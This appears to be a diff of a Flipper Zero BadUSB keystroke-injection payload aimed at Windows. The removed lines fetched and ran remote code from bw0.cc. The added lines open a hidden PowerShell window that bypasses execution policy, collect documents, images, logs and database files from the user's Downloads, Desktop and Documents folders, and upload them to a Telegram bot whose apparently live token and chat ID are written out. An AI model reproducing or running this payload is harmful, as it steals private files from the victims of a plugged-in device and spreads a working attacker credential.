@@ -1,19 +1,43 @@
+REM Flipper Zero - Universal File Sender
+REM Sends ALL files from user folders
 
-REM Title: beigeworm's Exfiltrate files to Telegram
-REM Author: @beigeworm
-REM Description: This script searches the users folder fot pictures, documents, logs, PDFs and more, then sends its all to a dropbox account.
-REM Target: Windows 10
-
-REM *SETUP*
-REM replace TELEGRAM_TOKEN with your Telegram Token.
-
-REM some setup for dukie script
-DEFAULT_DELAY 100
-
-REM open powershell (remove -W Hidden to show the window)
-DELAY 1000
+DELAY 4000
 GUI r
-DELAY 750
-STRING powershell -Ep Bypass -C $tg='TELEGRAM_TOKEN'; iex (irm bw0.cc/extg)
-ENTER
+DELAY 800
+STRING powershell -NoP -W H -Exec B -C "
+# Configuration
+`$BOT = '8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI'
+`$CHAT = '6614794141'
 
+# Start message
+curl.exe `"https://api.telegram.org/bot`$BOT/sendMessage?chat_id=`$CHAT&text=Starting+file+collection`"
+
+# Scan and send files from key locations
+`$LOCATIONS = @(
+    `$env:USERPROFILE + '\\Downloads',
+    `$env:USERPROFILE + '\\Desktop',
+    `$env:USERPROFILE + '\\Documents'
+)
+
+`$SENT = 0
+
+foreach (`$LOC in `$LOCATIONS) {
+    if (Test-Path `$LOC) {
+        # Get first 5 files of each common type
+        `$FILES = Get-ChildItem -Path `$LOC -Include '*.txt','*.pdf','*.doc','*.docx','*.xls','*.xlsx','*.jpg','*.png','*.log','*.db' `
+                 -File -ErrorAction SilentlyContinue -Depth 1 | Select-Object -First 5
+        
+        foreach (`$FILE in `$FILES) {
+            if (`$FILE.Length -lt 20MB) {
+                curl.exe -F `"chat_id=`$CHAT`" -F `"document=@`$(`$FILE.FullName)`" `"https://api.telegram.org/bot`$BOT/sendDocument`"
+                `$SENT++
+                Start-Sleep -Seconds 1
+            }
+        }
+    }
+}
+
+# Completion message
+curl.exe `"https://api.telegram.org/bot`$BOT/sendMessage?chat_id=`$CHAT&text=Completed.+Sent+`$SENT+files`"
+"
+ENTER
